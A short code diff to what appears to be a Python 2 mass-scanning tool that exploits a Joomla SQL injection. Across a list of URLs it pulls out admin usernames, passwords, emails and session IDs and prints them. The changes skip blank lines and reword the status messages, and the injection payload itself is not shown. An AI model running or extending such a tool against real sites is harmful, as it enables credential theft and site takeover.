@@ -335,7 +335,8 @@ def checkJoomla(value):
     else:
     	urlfile=open(value,'r')
     	for url in urlfile:
-    		checkJoomlaSQLi(url)
+            if url.strip():
+                checkJoomlaSQLi(url)
     	urlfile.close()
     
 def checkJoomlaSQLi(url):    
@@ -349,11 +350,11 @@ def checkJoomlaSQLi(url):
             password = getInfoByJoomlaSQLi(url, 'password')
             email = getInfoByJoomlaSQLi(url, 'email')
             session_id = getInfoByJoomlaSQLi(url, 'session_id')
-            print '[+] URL: '+url+', admin: '+username+', password: '+password+', email: '+email+', session_id: '+session_id 
+            print '[+] vuls found! url: '+url+', admin: '+username+', password: '+password+', email: '+email+', session_id: '+session_id 
         else:
-            print '[!] URL: '+url+', no vuls!'
+            print '[!] no vuls! url: '+url
     except Exception,e:
-        print '[!] URL: '+url+', connection failed!'
+        print '[!] connection failed! url: '+url
 
 def getInfoByJoomlaSQLi(url, param):
     if 'username' in param:
